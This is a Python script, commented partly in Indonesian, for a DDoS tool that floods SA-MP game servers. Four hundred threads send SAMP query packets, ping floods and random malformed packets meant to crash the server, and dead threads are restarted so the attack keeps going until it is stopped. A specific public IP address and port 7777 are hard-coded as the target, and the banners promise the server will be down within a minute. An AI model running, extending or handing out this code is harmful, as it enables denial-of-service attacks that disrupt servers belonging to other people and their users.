import socket
import threading
import time
import random
import struct
from datetime import datetime
import sys

class SAMPBrutalAttack:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = True
        self.packets_sent = 0
        self.start_time = datetime.now()
        self.lock = threading.Lock()
        
    def create_samp_packets(self):
        """Generate SAMP attack packets"""
        packets = []
        ip_parts = self.target_ip.split('.')
        ip_bytes = bytes([int(x) for x in ip_parts])
        port_bytes = struct.pack('H', self.target_port)
        
        # Info query - CPU intensive
        packets.append(b'SAMP' + ip_bytes + port_bytes + b'i')
        
        # Client list - Memory intensive
        packets.append(b'SAMP' + ip_bytes + port_bytes + b'c')
        
        # Rules query - Database intensive
        packets.append(b'SAMP' + ip_bytes + port_bytes + b'r')
        
        # Detail query
        packets.append(b'SAMP' + ip_bytes + port_bytes + b'd')
        
        # Ping floods (10 variants)
        for _ in range(10):
            ping_data = struct.pack('I', random.randint(0, 0xFFFFFFFF))
            packets.append(b'SAMP' + ip_bytes + port_bytes + b'p' + ping_data)
        
        # Malformed packets untuk crash (15 variants)
        for _ in range(15):
            size = random.randint(50, 500)
            malformed = b'SAMP' + ip_bytes + port_bytes + bytes([random.randint(0, 255)]) + bytes([random.randint(0, 255) for _ in range(size)])
            packets.append(malformed)
        
        return packets
    
    def attack_worker(self, thread_id):
        """Worker thread - aggressive UDP flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)  # 1MB send buffer
        
        packets = self.create_samp_packets()
        local_count = 0
        
        print(f"[Thread-{thread_id:03d}] ACTIVE", flush=True)
        
        while self.running:
            try:
                # Kirim burst 100 packets per loop
                for _ in range(100):
                    for packet in packets:
                        sock.sendto(packet, (self.target_ip, self.target_port))
                        local_count += 1
                
                # Update global counter setiap 50000 packets
                if local_count % 50000 == 0:
                    with self.lock:
                        self.packets_sent += local_count
                        local_count = 0
                        
            except:
                pass
        
        with self.lock:
            self.packets_sent += local_count
        
        sock.close()
    
    def stats_display(self):
        """Display live statistics"""
        while self.running:
            time.sleep(3)
            
            elapsed = (datetime.now() - self.start_time).total_seconds()
            if elapsed > 0:
                pps = self.packets_sent / elapsed
                mbps = (self.packets_sent * 200 * 8) / (elapsed * 1024 * 1024)  # Estimasi 200 bytes per packet
                
                sys.stdout.write(f"\r[ATTACK] Uptime: {int(elapsed)}s | Packets: {self.packets_sent:,} | PPS: {pps:,.0f} | ~{mbps:.1f} Mbps")
                sys.stdout.flush()
    
    def launch(self, num_threads=400):
        """Launch attack dengan banyak threads"""
        print("="*70)
        print("  SAMP SERVER DESTRUCTION MODE")
        print("="*70)
        print(f"Target: {self.target_ip}:{self.target_port}")
        print(f"Threads: {num_threads}")
        print("="*70)
        print("\n[*] Launching attack in 2 seconds...")
        time.sleep(2)
        
        threads = []
        
        # Stats display thread
        stats_thread = threading.Thread(target=self.stats_display, daemon=True)
        stats_thread.start()
        
        # Launch attack threads
        print(f"[*] Spawning {num_threads} attack threads...\n")
        for i in range(num_threads):
            t = threading.Thread(target=self.attack_worker, args=(i+1,), daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.005)
        
        print(f"\n[!!!] ATTACK ACTIVE - {num_threads} threads bombarding target")
        print("[!!!] Server will be DOWN in 30-60 seconds")
        print("[*] Attack will continue indefinitely until you stop it\n")
        
        # Keep running
        try:
            while True:
                time.sleep(60)
                # Auto-restart dead threads
                for i, t in enumerate(threads):
                    if not t.is_alive():
                        threads[i] = threading.Thread(target=self.attack_worker, args=(i+1,), daemon=True)
                        threads[i].start()
        except KeyboardInterrupt:
            print("\n\n[*] Stopping attack...")
            self.running = False
            time.sleep(2)
            
            elapsed = (datetime.now() - self.start_time).total_seconds()
            print("\n" + "="*70)
            print("  ATTACK SUMMARY")
            print("="*70)
            print(f"Duration: {int(elapsed)}s ({int(elapsed/60)}m {int(elapsed%60)}s)")
            print(f"Total Packets: {self.packets_sent:,}")
            print(f"Average PPS: {self.packets_sent/elapsed:,.0f}")
            print("="*70)


if __name__ == "__main__":
    TARGET_IP = "104.234.180.137"
    TARGET_PORT = 7777
    
    print("""
    ╔══════════════════════════════════════════════╗
    ║   SAMP BRUTAL DDOS - CONTINUOUS MODE         ║
    ║   Target akan diserang sampai Anda stop      ║
    ╚══════════════════════════════════════════════╝
    """)
    
    attacker = SAMPBrutalAttack(TARGET_IP, TARGET_PORT)
    attacker.launch(num_threads=400)
